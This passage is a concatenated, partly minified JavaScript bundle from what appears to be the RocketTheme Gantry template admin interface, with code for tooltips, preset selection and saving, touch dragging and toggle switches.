			labels = panels.getElements('.gantry-panel-left .gantry-field > label:not(.rokchecks), .gantry-panel-left .gantry-field span[class!=chain-label][class!=group-label] > label:not(.rokchecks)');
		}
		else {
			labels = panels.getElements('.gantry-panel-left .gantry-field .base-label label');
		}
		labels.each(function(labelsList, i){
			if (labelsList.length) {
				labelsList.addEvent('mouseenter', function() {
					var index = labelsList.indexOf(this);
					var panel = panels[i];
					if (panel) {
						var id = (!this.id) ? false : 'tip-' + this.id.replace(GantryParamsPrefix, '').replace(/-lbl$/, '');
						var tipArrow = panel.getElement('.gantrytips-left');
						if (tipArrow) {
							if (!id || !document.id(id)) tipArrow.fireEvent('jumpTo', index + 1);
							else tipArrow.fireEvent('jumpById', id);
						}
					}
				});
			}
		});
	}
};

Gantry.ToolBar = {
	'add': function(meta_name) {
		var screenMeta = document.id('screen-meta');
		if (screenMeta) document.id('contextual-'+meta_name+'-wrap').inject(screenMeta, 'top');
		(function($){
			var othersmeta = $('#screen-meta-links > div[id!=meta-'+meta_name+'-link-wrap]');
			$('#meta-'+meta_name+'-link').click(function () {
				if (!$('#contextual-'+meta_name+'-wrap').hasClass('contextual-'+meta_name+'-open'))
					$('#screen-meta-links > div[id!=meta-'+meta_name+'-link-wrap]').css('visibility', 'hidden');

				$('#contextual-'+meta_name+'-wrap').slideToggle('fast', function() {
					if ($(this).hasClass('contextual-'+meta_name+'-open')) {
						$('#meta-'+meta_name+'-link').css({'backgroundPosition':'top right'});
						othersmeta.css('visibility', '');
						$(this).removeClass('contextual-'+meta_name+'-open');
					} else {
						$('#meta-'+meta_name+'-link').css({'backgroundPosition':'bottom right'});
						$(this).addClass('contextual-'+meta_name+'-open');
					}
				});

				return false;
			});
		})(jQuery);
	}
};

Gantry.Layer = new Class({
	Implements: [Events, Options],
	options: {
		duration: 200,
		opacity: 0.8
	},

	initialize: function(options) {
		var self = this;

		this.setOptions(options);

		this.id = new Element('div', {id: 'gantry-layer'}).inject(document.body);
		this.fx = new Fx.Tween(this.id, {
			'duration': this.options.duration,
			'wait': false,
			'onComplete': function() {
				if (!this.to[0].value) {
					self.open = false;
				} else {
					self.open = true;
					self.fireEvent('show');
				}
			}
		}).set('opacity', 0);
		this.open = false;

	},

	show: function() {
		this.calcSizes();
		this.fx.start('opacity', this.options.opacity);
	},

	hide: function() {
		this.fireEvent('hide');
		this.fx.start('opacity', 0);
	},

	toggle: function() {
		this[this.open ? 'hide' : 'show']();
	},

	calcSizes: function() {
		this.id.setStyles({
			'width': window.getScrollSize().x,
			'height': window.getScrollSize().y
		});
	}
});

window.addEvent('domready', Gantry.init);
window.addEvent('load', Gantry.load);
var Tips = new Class({});


/*** preset.js ***/

/**
 * @version		1.26 September 14, 2012
 * @author		RocketTheme http://www.rockettheme.com
 * @copyright 	Copyright (C) 2007 - 2012 RocketTheme, LLC
 * @license		http://www.gnu.org/licenses/gpl-2.0.html GNU/GPLv2 only
 */

var PresetDropdown={list:{},init:function(a){PresetDropdown.list[a]=document.id(GantryParamsPrefix+a);var b=selectboxes.getObjects(PresetDropdown.list[a].getPrevious());b.real.addEvent("change",PresetDropdown.select.bind(PresetDropdown,a));},newItem:function(i,g,f){if(!PresetDropdown.list[i]&&$$("."+i).length){return Scroller.addBlock(i,g,f);}var h=new Element("li").set("text",f);var e=new Element("option",{value:g}).set("text",f);var d=selectboxes.getObjects(PresetDropdown.list[i].getPrevious());var a=null;d.real.getChildren().each(function(k,j){if(k.value==g){a=j;}});if(a==null){e.inject(PresetDropdown.list[i]);h.inject(PresetDropdown.list[i].getPrevious().getLast().getElement("ul"));PresetDropdown.attach(i);}else{var c=d.real.getChildren()[a],b=PresetDropdown.list[i].getPrevious().getLast().getElement("ul").getChildren()[a];c.replaceWith(e);b.replaceWith(h);PresetDropdown.attach(i,a);}return true;},attach:function(a,c){var e=selectboxes.getObjects(PresetDropdown.list[a].getPrevious()),b=this;if(c==null){c=e.list.length-1;}var d=e.list[c];d.addEvents({mouseenter:function(){e.list.removeClass("hover");this.addClass("hover");},mouseleave:function(){this.removeClass("hover");},click:function(){e.list.removeClass("active");this.addClass("active");this.fireEvent("select",[e,c]);},select:selectboxes.select.pass(selectboxes,[e,c])});selectboxes.updateSizes(PresetDropdown.list[a].getPrevious());d.fireEvent("select");},select:function(a){var c=Presets[a].get(PresetDropdown.list[a].getPrevious().getElement(".selected span").get("text"));var b=document.id("master-items");if(b){b=b.hasClass("active");}$H(c).each(function(i,j){var e=document.id(GantryParamsPrefix+j);var h=e.get("tag");if(b&&Gantry.MenuItemHead){Gantry.MenuItemHead.getCheckbox(j).fireEvent("switchon");}switch(h){case"select":var k=e.getElements("option").getProperty("value");var g=selectboxes.getObjects(e.getParent());selectboxes.select(g,k.indexOf(i));break;case"input":var l=e.getProperty("class");e.setProperty("value",i);if(l.contains("picker-input")){e.fireEvent("keyup");}else{if(l.contains("slider")){var d=window["slider"+j];d.set(d.list.indexOf(i));}else{if(l.contains("toggle")){var f=j.replace("-","");window["toggle"+f].set(i.toInt());window["toggle"+f].fireEvent("onChange",i.toInt());}}}break;}});}};var Scroller={init:function(a){Scroller.wrapper=$$("."+a+" .scroller .wrapper")[0];Scroller.bar=$$("."+a+" .bar")[0];if(!Scroller.wrapper||!Scroller.bar){return;}document.id("contextual-preset-wrap").setStyles({position:"absolute",top:-3000,display:"block"});Scroller.childrens=Scroller.wrapper.getChildren();var b=Scroller.wrapper.getParent().getSize();var d=Scroller.wrapper.getSize();Scroller.barWrapper=new Element("div",{styles:{position:"absolute",left:0,bottom:0,width:Scroller.bar.getStyle("width"),height:Scroller.bar.getStyle("height")}}).inject(Scroller.bar,"before");Scroller.getBarSize();Scroller.bar.inject(Scroller.barWrapper).setStyles({bottom:1,left:0});Scroller.children(a);var c=$$(".delete-preset");c.each(function(e){e.addEvent("click",function(f){new Event(f).stop();Scroller.deleter(this,a);});});if(Scroller.size>b.x){return;}Scroller.bar.setStyle("width",Scroller.size);Scroller.drag(Scroller.wrapper,Scroller.bar);document.id("contextual-preset-wrap").setStyles({position:"relative",top:0,display:"none"});},deleter:function(c,a){var b=c.id.replace("keydelete-","");new Request.HTML({url:AdminURI+"?option=com_admin&tmpl=gantry-ajax-admin",onSuccess:function(d){Scroller.deleteAction(d,c,a,b);}}).post({action:"gantry_admin",model:"presets-saver",gantry_action:"delete",template:Gantry.PresetsSaver.Template,"preset-title":a,"preset-key":b});},deleteAction:function(a,i,j,h){if(PresetsKeys[j].contains(h)){i.dispose();}else{var c=i.getParent();Scroller.childrens.erase(c);var f=c.getSize().x;c.empty().dispose();var g=Scroller.childrens.getLast().addClass("last");var d=Scroller.childrens[0].addClass("first");var e=Scroller.wrapper.getStyle("width").toInt();Scroller.wrapper.setStyle("width",e-f);var b=Math.abs(Scroller.bar.getStyle("width").toInt()-Scroller.getBarSize());Scroller.bar.setStyle("width",Scroller.getBarSize());if(Scroller.bar.getStyle("left").toInt()>Scroller.getBarSize()/2){Scroller.bar.setStyle("left",Scroller.bar.getStyle("left").toInt()-b);}}Scroller.wrapper.getParent().scrollTo(e);if(typeof CustomPresets!="undefined"&&CustomPresets[h]){delete CustomPresets[h];}},getBarSize:function(){var a=Scroller.wrapper.getParent().getSize();var b=Scroller.wrapper.getSize();Scroller.size=a.x*Scroller.barWrapper.getStyle("width").toInt()/b.x;return Scroller.size;},addBlock:function(o,m,j){var n=Presets[o].get(j);if(!n){if(document.id("contextual-preset-wrap").getStyle("display")=="none"){document.id("contextual-preset-wrap").setStyles({position:"absolute",top:-3000,display:"block"});}var l=Scroller.childrens[Scroller.childrens.length-1],a=Scroller.childrens.length;var h=l.clone();h.inject(l,"after").addClass("last").className="";h.className="preset"+(a+1)+" block last";h.getElement("span").set("html",j);l.removeClass("last");var e=h.getFirst().getStyle("background-image");var d=e.split("/");var c=d[d.length-1];var b=m+'.png")';var k=d.join("/").replace(c,b);h.getFirst().setStyle("background-image","");h.getFirst().setStyle("background-image",k);var f=Scroller.wrapper.getStyle("width").toInt();var g=h.getSize().x;Scroller.wrapper.setStyle("width",f+198);Scroller.bar.setStyle("width",Scroller.getBarSize());Scroller.childrens.push(h);Scroller.child(o,h);var i=new Element("div",{id:"keydelete-"+m,"class":"delete-preset"}).set("html","<span>X</span>").inject(h);i.addEvent("click",function(p){new Event(p).stop();Scroller.deleter(this,o);});if(document.id("contextual-preset-wrap").getStyle("display")=="block"&&document.id("contextual-preset-wrap").getStyle("top").toInt()==-3000){document.id("contextual-preset-wrap").setStyles({position:"relative",top:0,display:"none"});}}},drag:function(b,a){Scroller.dragger=new Drag.Move(a,{container:Scroller.barWrapper,onDrag:function(){var e=Scroller.wrapper.getParent();var d=e.getSize();var c=this.value.now.x*e.getScrollSize().x/d.x;if(c>c/2){c+=10;}else{c-=10;}e.scrollTo(c);}});Scroller.wrapper.getParent().scrollTo(0);},child:function(a,c){c.getFirst().setStyle("border","1px solid #000");var b=new Fx.Tween(c.getFirst(),{duration:300}).set("border-color","#000");c.addEvent("click",function(d){new Event(d).stop();b.start("border-color","#fff").chain(function(){this.start("border-color","#000");}).chain(function(){this.start("border-color","#fff");}).chain(function(){this.start("border-color","#000");});Scroller.updateParams(a,c);});},children:function(a){Scroller.childrens.each(function(d,b){d.getFirst().setStyle("border","1px solid #000");var c=new Fx.Tween(d.getFirst(),{duration:300}).set("border-color","#000");Scroller.labs=new Hash({});Scroller.involved=$$(".presets-involved");Scroller.involvedFx=[];Scroller.involved.each(function(e){Scroller.involvedFx.push(new Fx.Tween(e,{link:"cancel"}).set("opacity",0));});d.addEvent("click",function(f){new Event(f).stop();c.start("border-color","#fff").chain(function(){this.start("border-color","#000");}).chain(function(){this.start("border-color","#fff");}).chain(function(){this.start("border-color","#000");});Scroller.updateParams(a,d,b);});});},updateParams:function(i,b,e){var j=b.getElement("span").get("text");var g=Presets[i].get(j);var h=b.getElement(".delete-preset");if(h){var d=h.id.replace("keydelete-","");if(CustomPresets[d]){g=CustomPresets[d];}}var a=document.id("master-items");if(a){a=a.hasClass("active");}var f={};var c=Scroller.labs;c.each(function(k){k.each(function(m){var l=m.retrieve("gantry:text",false);if(l){m.set("text",l);m.store("gantry:notice",false);}Scroller.involved.set("text",0);});});$H(g).each(function(t,u){if(u=="name"){return;}var m=document.id(GantryParamsPrefix+u.replace(/-/,"_"));if(!m){return;}if(!c.get(j)){c.set(j,[]);}var q=m.get("tag");var k=m.getParent(".gantry-panel").className.replace(/[panel|\-|\s|gantry]/g,"").toInt()-1;if(!f[k]){f[k]=0;}f[k]++;Scroller.involved[k].set("text",f[k]);var s;if(m.getParent(".gantry-field").getElement(".base-label")){s=m.getParent(".gantry-field").getElement(".base-label label");}else{s=m.getParent(".gantry-field").getElement("label");}var r=c.get(j);if(!r.contains(s)){r.push(s);}if(!s.retrieve("gantry:notice",false)){s.store("gantry:text",s.get("text"));s.set("html",'<span class="preset-info">&#9679;</span> '+s.retrieve("gantry:text"));s.store("gantry:notice",true);}if(a&&Gantry.MenuItemHead){Gantry.MenuItemHead.getCheckbox(u).fireEvent("switchon");}switch(q){case"select":var v=m.getElements("option").getProperty("value");var p=selectboxes.getObjects(m.getParent());selectboxes.select(p,v.indexOf(t));break;case"input":var w=m.getProperty("class");m.setProperty("value",t);if(w.contains("picker-input")){m.fireEvent("keyup");}else{if(w.contains("slider")){var l=window.sliders[(GantryParamsPrefix+u.replace(/-/,"_")).replace("-","_")];l.set(l.list.indexOf(t));l.hiddenEl.fireEvent("set",t);}else{if(w.contains("toggle")){var o=(GantryParamsPrefix+u.replace(/-/,"_")).replace("-","");window["toggle"+o].set(t.toInt());window["toggle"+o].fireEvent("onChange",t.toInt());}}}break;}});Scroller.involved.each(function(k,l){var m=k.get("text").toInt();if(!m){Scroller.involvedFx[l].element.getParent().removeClass("double-badge");Scroller.involvedFx[l].cancel().start("opacity",[1,0]).chain(function(){this.element.setStyle("display","none");});return;}var n=Scroller.involvedFx[l].element.getNext("span");if(n&&n.getStyle("display")=="block"){Scroller.involvedFx[l].element.getParent().addClass("double-badge");}else{Scroller.involvedFx[l].element.getParent().removeClass("double-badge");}k.setStyle("display","block");Scroller.involvedFx[l].start("opacity",[0,1]);});}};var PresetsBadges={init:function(a){if(!PresetsBadges.list){PresetsBadges.list=new Hash();}var b=PresetsBadges.getLabel(a);var d=[];PresetsBadges.list.set(a,[]);Presets[a].each(function(h,f){if(!d.length){for(var i in h){d.push(i);var g=PresetsBadges.getLabel(i);if(g){var e=PresetsBadges.build(i,g,b,false);PresetsBadges.list.get(a).push(e);}}}});if(!PresetsBadges.buttons){PresetsBadges.buttons=[];}var c=PresetsBadges.build(a,b,false,d.length);PresetsBadges.buttons.push(c);c.addEvents({click:function(f){new Event(f).stop();this.fireEvent("toggle");},show:function(){this.getElement(".number").setStyle("visibility","visible");$$(PresetsBadges.list.get(a)).setStyle("display","block");this.showing=true;},hide:function(){this.getElement(".number").setStyle("visibility","hidden");$$(PresetsBadges.list.get(a)).setStyle("display","none");this.showing=false;},toggle:function(){PresetsBadges.buttons.each(function(e){if(e!=c){e.fireEvent("hide");}});if(this.showing){this.fireEvent("hide");}else{this.fireEvent("show");}}});},build:function(n,i,j,f){var b=i.getChildren(),m=i.getSize().y,g;var a=i.getElement(".presets-wrapper");if(!a){a=new Element("div",{"class":"presets-wrapper",styles:{position:"relative"}}).inject(i,"top");b.each(a.adopt.bind(a));a.setStyle("height",m+15);i.getElement(".hasTip").setStyle("line-height",m+15);}var l=(j)?j.getElement(".hasTip").innerHTML:GantryLang.show_parameters;g=new Element("div",{"class":"presets-badge"}).inject(a,"top");var c=new Element("span",{"class":"left"}).inject(g);var k=new Element("span",{"class":"right"}).inject(c).set("text",l);if($chk(f)){var d=new Element("span",{"class":"number"}).inject(k);d.set("text",f).setStyle("visibility","hidden");g.setStyle("cursor","pointer").addClass("parent");}else{g.setStyle("display","none");var e=i.getNext().getFirst().getLast();if(e){var h=e.getStyle("top").toInt();e.setStyle("top",h-10);}}return g;},getLabel:function(a){var c=document.id(GantryParamsPrefix+a);if(c){var d=c.getParent(),b=null;while(d&&d.get("tag")!="table"){if(d.get("tag")=="tr"){b=d;}d=d.getParent();}return b.getFirst();}else{return null;}}};

/*** preset-saver.js ***/

/**
 * @version		1.26 September 14, 2012
 * @author		RocketTheme http://www.rockettheme.com
 * @copyright 	Copyright (C) 2007 - 2012 RocketTheme, LLC
 * @license		http://www.gnu.org/licenses/gpl-2.0.html GNU/GPLv2 only
 */

Gantry.PresetsSaver={init:function(){var a=$$(".preset-saver");Gantry.PresetsSaver.bounds={show:Gantry.PresetsSaver.build.bind(Gantry.PresetsSaver)};a.each(function(b){b.addEvent("click",function(c){new Event(c).stop();Gantry.Overlay.addEvent("show",Gantry.PresetsSaver.bounds.show);Gantry.Overlay.show();});});Gantry.PresetsSaver.Template=$$("input[name=id]");if(Gantry.PresetsSaver.Template.length){Gantry.PresetsSaver.Template=Gantry.PresetsSaver.Template[0].value;}else{Gantry.PresetsSaver.Template=false;}},build:function(){var f=new Element("div",{id:"presets-namer","class":"gantry-layer-wrapper"}).inject(document.body);var e=new Element("h2").set("text",GantryLang.preset_title).inject(f);var b=new Element("div",{"class":"preset-namer-inner"}).inject(f);Gantry.PresetsSaver.wrapper=f;Gantry.PresetsSaver.innerWrapper=b;var d=new Element("p").set("text",GantryLang.preset_select).inject(b);var c=new Hash(Presets);c.each(function(o,r){var m=new Element("div",{"class":"preset-namer valid-preset-"+r}).inject(b);var n=new Element("h3",{"class":"preset-namer-title"}).set("html",GantryLang.preset_naming+' "<span>'+r+'</span>"').inject(m);if(c.length>1){var q=new Element("span",{"class":"skip"}).set("text",GantryLang.preset_skip).inject(n);}var i=new Element("div").set("html","<label><span>"+GantryLang.preset_name+'</span><input type="text" class="text-long input-name" id="'+r+'_namer_name" /></label>').inject(m);var j=new Element("div").set("html","<label><span>"+GantryLang.key_name+'</span><input type="text" class="text-long input-key example" tabindex="-1" id="'+r+'_namer_key" /></label>').inject(m);var g=i.getElement("input"),l=j.getElement("input");Gantry.PresetsSaver.valExample="ex, Preset 1";Gantry.PresetsSaver.keyExample="(optional) ex, preset1";var p=Gantry.PresetsSaver.valExample,k=Gantry.PresetsSaver.keyExample;g.addClass("example").value=p;l.value=k;g.addEvents({focus:function(){if(this.value==p){this.value="";}this.removeClass("example");},blur:function(){if(this.value==""){this.addClass("example").value=p;}Gantry.PresetsSaver.checkInputs();},keyup:function(){this.value=this.value.replace(/[^a-z0-9\s]/gi,"");if(this.value.length){l.value=this.value.toLowerCase().clean().replace(/\s/g,"");}Gantry.PresetsSaver.checkInputs();}});l.addEvents({focus:function(){if(this.value==k){this.value="";}this.removeClass("example");},blur:function(){if(this.value==""&&(g.value!=""&&g.value!=p)){this.value=g.value.toLowerCase().clean().replace(/\s/g,"");}else{if(this.value==""){this.value=k;}}this.addClass("example");Gantry.PresetsSaver.checkInputs();},keyup:function(s){this.value=this.value.replace(/[^a-z0-9\s]/gi,"");this.value=this.value.toLowerCase().clean().replace(/\s/g,"");Gantry.PresetsSaver.checkInputs();}});if(c.getLength()>1){var h=new Fx.Morph(m,{duration:200,onComplete:function(){m.empty().dispose();Gantry.PresetsSaver.center(f);Gantry.PresetsSaver.checkInputs();}}).set({opacity:1});q.addEvent("click",function(){g.removeEvents("focus").removeEvents("blur").removeEvents("keyup");l.removeEvents("focus").removeEvents("blur").removeEvents("keyup");m.setStyle("overflow","hidden");h.start({opacity:0,height:0});});}});var a=new Element("div",{"class":"preset-bottom"}).inject(f);Gantry.PresetsSaver.savePreset=new Element("button",{disabled:"disabled"}).set("text",GantryLang.save).inject(a);Gantry.PresetsSaver.cancel=new Element("button").set("text",GantryLang.cancel).inject(a);Gantry.PresetsSaver.cancel.addEvent("click",function(g){Gantry.Overlay.removeEvent("show",Gantry.PresetsSaver.bounds.show);f.empty().dispose();Gantry.Overlay.hide();});Gantry.PresetsSaver.savePreset.addEvent("click",Gantry.PresetsSaver.save);Gantry.PresetsSaver.center(f);},checkInputs:function(){var c=[],b=Gantry.PresetsSaver.wrapper.getElements("input");b.each(function(d,e){if(d.value!=""&&d.value!=Gantry.PresetsSaver[(!e%2)?"valExample":"keyExample"]){c[e]=true;}else{c[e]=false;}});var a=c.contains(false);if(a||!b.length){Gantry.PresetsSaver.savePreset.setProperty("disabled","disabled");}else{Gantry.PresetsSaver.savePreset.removeProperty("disabled");}return a;},save:function(){if(!Gantry.PresetsSaver.checkInputs){return;}var a=[];Gantry.PresetsSaver.wrapper.getElements(".preset-namer").each(function(c){a.push(c.getElements("input"));});Gantry.PresetsSaver.data=Gantry.PresetsSaver.getPresets(a);var b=Gantry.PresetsSaver.data;new Request.HTML({url:AdminURI+"?option=com_admin&tmpl=gantry-ajax-admin",onSuccess:Gantry.PresetsSaver.handleResponse}).post({action:"gantry_admin",model:"presets-saver",gantry_action:"add",template:Gantry.PresetsSaver.Template,"presets-data":JSON.encode(b)});},handleResponse:function(k,e,d){var b=Gantry.PresetsSaver.wrapper,j=Gantry.PresetsSaver.innerWrapper;var g,h,c;if(d=="success"){$H(Gantry.PresetsSaver.data).each(function(m,l){$H(m).each(function(n,p){var o=n.name;PresetDropdown.newItem(l,p,o);delete n.name;Presets[l].set(o,n);});});var i=new Element("div",{"class":"preset-success"}).inject(j,"after");j.empty().dispose();g=new Element("div",{"class":"success-icon"}).inject(i);h=new Element("div").set("html","<h3>"+GantryLang.success_save+"</h3>").inject(i);c=new Element("div").set("html",GantryLang.success_msg).inject(i);Gantry.PresetsSaver.savePreset.setStyle("display","none");Gantry.PresetsSaver.cancel.set("html",GantryLang.close);}else{j.setStyle("display","none");var f=new Element("div",{"class":"preset-error"}).inject(j,"after");g=new Element("div",{"class":"error-icon"}).inject(f);h=new Element("div").set("html","<h3>"+GantryLang.fail_save+"</h3>").inject(f);c=new Element("div").set("html",GantryLang.fail_msg).inject(f);var a=Gantry.PresetsSaver.savePreset.clone();Gantry.PresetsSaver.savePreset.setStyle("display","none");a.inject(Gantry.PresetsSaver.savePreset,"before").set("html",GantryLang.retry).addEvent("click",function(){f.empty().dispose();j.setStyle("display","block");Gantry.PresetsSaver.savePreset.setStyle("display","");a.dispose();});}},center:function(d){var c=window.getSize();var a=d.getSize();var b={left:(c.x/2)+window.getScroll().x-a.x/2,top:(c.y/2)+window.getScroll().y-a.y/2};d.setStyles(b);},getPresets:function(c){var b=new Hash(Presets);var e=1,d=0;var a={};b.each(function(g,f){if(!Gantry.PresetsSaver.wrapper.getElement(".valid-preset-"+f)){return;}var h=b.get(f);a[f]={};a[f][c[d][1].value]={};a[f][c[d][1].value]["name"]=c[d][0].value;e=1;h.each(function(i,j){i=new Hash(i);if(e>1){return;}else{i.each(function(n,m){var l=m.replace(/-/,"_"),k=m.replace(/_/,"-");if(document.id(GantryParamsPrefix+l)){a[f][c[d][1].value][k]=document.id(GantryParamsPrefix+l).get("value")||"";}});}e++;});d++;});return a;}};window.addEvent("domready",Gantry.PresetsSaver.init);

/*** tips.js ***/

/**
 * @version		1.26 September 14, 2012
 * @author		RocketTheme http://www.rockettheme.com
 * @copyright 	Copyright (C) 2007 - 2012 RocketTheme, LLC
 * @license		http://www.gnu.org/licenses/gpl-2.0.html GNU/GPLv2 only
 */

var GantryTips={init:function(){var a=document.getElements(".gantrytips");if(!a){return;}a.each(function(c,e){var d=c.getElements(".gantrytips-controller .gantrytips-left, .gantrytips-controller .gantrytips-right");var g=c.getElement(".current-tip");var f=g.get("html").toInt();var b=c.getElements(".gantrytips-tip");b.each(function(j,h){j.set("opacity",(h==f-1)?1:0);});d.addEvents({click:function(){var i=this.hasClass("gantrytips-left");var h=f;if(i){f-=1;if(f<=0){f=b.length;}}else{f+=1;if(f>b.length){f=1;}}this.fireEvent("jumpTo",[f,h]);},jumpTo:function(j,i){if(!i){i=f;}f=j;if(!b[f-1]||!b[i-1]){return;}var k=c.getElement(".gantrytips-wrapper");var h=b[f-1].getSize().y+15;b.fade("out");if(h>=190){k.tween("height",h);}b[f-1].fade("in");g.set("text",f);},jumpById:function(k,i){if(!i){i=f;}f=b.indexOf(document.id(k))||0;if(f==-1){return;}var j=c.getElement(".gantrytips-wrapper");var h=b[f].getSize().y+15;b.fade("out");if(h>=190){j.tween("height",h);}b[f].fade("in");f+=1;g.set("text",f);},selectstart:function(h){h.stop();}});d[0].fireEvent("jumpTo",1);d[1].fireEvent("jumpTo",1);});}};window.addEvent("domready",GantryTips.init);

/*** touch.js ***/

/*=
	name: Touch
	version: 0.1
	description: Simple drag implementation that works with standard-sized browsers and hooks with mobile safari touch events.
	license: MooTools MIT-Style License (http://mootools.net/license.txt)
	copyright: Valerio Proietti (http://mad4milk.net)
	authors: Valerio Proietti (http://mad4milk.net)
	requires: MooTools 1.2.3+ (Core) (http://mootools.net/download)
=*/

var Touch=new Class({initialize:function(a){this.element=document.id(a);this.bound={start:this.start.bind(this),move:this.move.bind(this),end:this.end.bind(this)};if(window.orientation!=undefined){this.context=this.element;this.startEvent="touchstart";this.endEvent="touchend";this.moveEvent="touchmove";}else{this.context=document;this.startEvent="mousedown";this.endEvent="mouseup";this.moveEvent="mousemove";}this.attach();},attach:function(){this.element.addListener(this.startEvent,this.bound.start);},detach:function(){this.element.removeListener(this.startEvent,this.bound.start);},start:function(a){this.preventDefault(a);document.body.style.WebkitUserSelect="none";this.hasDragged=false;this.context.addListener(this.moveEvent,this.bound.move);this.context.addListener(this.endEvent,this.bound.end);var b=this.getPage(a);this.startX=b.pageX;this.startY=b.pageY;this.fireEvent("start");},move:function(a){this.preventDefault(a);this.hasDragged=true;var b=this.getPage(a);this.deltaX=b.pageX-this.startX;this.deltaY=b.pageY-this.startY;this.fireEvent("move",[this.deltaX,this.deltaY]);},end:function(a){this.preventDefault(a);document.body.style.WebkitUserSelect="";this.context.removeListener(this.moveEvent,this.bound.move);this.context.removeListener(this.endEvent,this.bound.end);this.fireEvent((this.hasDragged)?"end":"cancel");},preventDefault:function(a){if(a.preventDefault){a.preventDefault();}else{a.returnValue=false;}},getPage:function(b){if(b.targetTouches){b=b.targetTouches[0];}if(b.pageX!=null&&b.pageY!=null){return{pageX:b.pageX,pageY:b.pageY};}var a=(!document.compatMode||document.compatMode=="CSS1Compat")?document.documentElement:document.body;return{pageX:b.clientX+a.scrollLeft,pageY:b.clientY+a.scrollTop};}});Touch.implement(new Events);

/*** toggle.js ***/

/*=
	name: Switch
	version: 0.1
	description: On-off iPhone style switch button.
	license: MooTools MIT-Style License (http://mootools.net/license.txt)
	copyright: Valerio Proietti (http://mad4milk.net)
	authors: Valerio Proietti (http://mad4milk.net)
	requires: MooTools 1.2.3+, Touch 0.1+ (http://github.com/kamicane/mootools-touch)
=*/

(function(){var a=this.Toggle=new Class({Implements:[Options,Events],options:{radius:3,duration:250,transition:"sine:in:out",classname:".toggle-input"},initialize:function(b){this.setOptions(b);this.elements=document.getElements(this.options.classname);var c={attach:this.attach.bind(this),detach:this.detach.bind(this),set:this.set.bind(this)};this.width=50;this.height=23;this.min=this.options.radius;this.max=47;this.half=25;this.elements.each(function(d){var e=d.getParent(".toggle-container"),f={container:{toggle:d,bound:this.mouseover.bind(this,e)},toggle:{input:d,container:e,checked:d.checked}};d.store("details",f.toggle);e.store("details",f.container);d.addEvents(c);e.addEvent("mouseenter",f.container.bound);},this);},attach:function(b){this.check(b.input);b.container.removeClass("disabled");b.dragButton.attach();b.dragSwitch.attach();},detach:function(b){this.check(b.input);b.container.addClass("disabled");b.dragButton.detach();b.dragSwitch.detach();},mouseover:function(c){var d=c.retrieve("details"),b=d.toggle.retrieve("details");c.removeEvent("mouseenter",d.bound);b.button=c.getElement(".toggle-button");b.sides=c.getElement(".toggle-sides");b.switcher=c.getElement(".toggle-switch");d.toggle.store("details",b);this.attachEvents(d.toggle);if(c.hasClass("disabled")){this.detach(b);}},attachEvents:function(f){var b=f.retrieve("details"),i=this.options.duration/this.width,d=new Fx({duration:this.options.duration,transition:this.options.transition,link:"cancel"}),l=this;var e=b.button,h=b.switcher,c=b.sides;b.steps=i;f.store("animating",false);d.set=function(m){this.update(e,h,c,m);}.bind(this);var g=new Touch(e),j=new Touch(h),k=function(){if(!f.retrieve("animating")){this.toggle(b);}}.bind(this);g.addEvents({start:function(m){f.focus();b.position=e.offsetLeft;},move:function(m){l.update(e,h,c,b.position+m);},end:function(m){var o=e.offsetLeft;var n=(o>l.half)?true:false;l.change(b,n);},cancel:k});j.addEvents({cancel:k,start:function(){f.focus();}});b.fx=d;b.dragButton=g;b.dragSwitch=j;f.store("details",b);},check:function(b){if(!b){return;}var c=b.retrieve("details");if(!c.dragButton){this.mouseover(c.container);}},toggle:function(b){this.check(b.input);this.change(b,(b.button.offsetLeft>this.half)?false:true);},change:function(c,d,b){this.check(c.input);if(typeof d=="string"){d=d.toInt();}if(c.input.retrieve("animating")){return this;}if(b){this.set(c,d);}else{this.animate(c,d);}c.input.checked=d;c.input.value=(!d)?0:1;c.checked=d;c.input.store("details",c);this.onChange(c,d);c.input.fireEvent("onChange",d);this.fireEvent("onChange",d);return this;},onChange:function(c,e){var d=(e)?1:0;c.input.getPrevious().set("value",d);if(c.container.getParent().getParent()!=c.container.getParent(".gantry-field").getFirst(".wrapper .wrapper")){return;}var b=c.container.getParent(".chain").getAllNext(".chain");if(b.length){b.each(function(h){var g=h.className.split(" "),i="";g.each(function(l){if(l.contains("base-")){i=l.replace("base-","");}});if(["selectbox"].contains(i)){var f=h.getElement("select");if(document.id(f)){document.id(f).getParent(".selectbox-wrapper").fireEvent("mouseenter");if(document.id(f).fireEvent("detach")){if(d){f.fireEvent("attach");}else{f.fireEvent("detach");}}}}if(["text"].contains(i)){var k=h.getElement("input[type=text]");if(document.id(k).fireEvent("detach")){if(d){k.fireEvent("attach");}else{k.fireEvent("detach");}}}if(["toggle"].contains(i)&&h!=c.container.getParent(".wrapper").getFirst()){var j=h.getElement("input[type=checkbox]");if(j){(function(){var l=j.retrieve("details");if(d){j.fireEvent("attach",l);}else{j.fireEvent("detach",l);}}).delay(10);}}},this);}},set:function(b,c){this.check(b.input);if(typeof c=="string"){c=c.toInt();}this.update(b.button,b.switcher,b.sides,c?this.width:0);this.onChange(b,c);},animate:function(c,e){this.check(c.input);c.input.store("animating",true);var h=c.button.offsetLeft,g=(e)?this.width:0,b=c.button,d=c.fx,f=c.dragButton;d.options.duration=Math.abs(h-g)*c.steps;f.detach();d.cancel().start(h,g).chain(function(){f.attach();c.input.store("animating",false);}.bind(this));},update:function(c,e,d,b){if(b<3){b=0;}else{if(b>47){b=50;}}e.style.left=b-50+"px";c.style.left=b+"px";this.updateSides(d,b);},updateSides:function(d,c){var f="0 0",b=-this.height;var e={off:"0 "+(b*3),on:"0 "+(b*2)};if(c==0){f=e.off+"px";}else{if(c==this.width){f=e.on+"px";}else{f="0 "+(b*4)+"px";}}d.style.backgroundPosition=f;}});})();

/*** selectbox.js ***/

/**
 * @version		1.26 September 14, 2012
 * @author		RocketTheme http://www.rockettheme.com
 * @copyright 	Copyright (C) 2007 - 2012 RocketTheme, LLC
 * @license		http://www.gnu.org/licenses/gpl-2.0.html GNU/GPLv2 only
 */

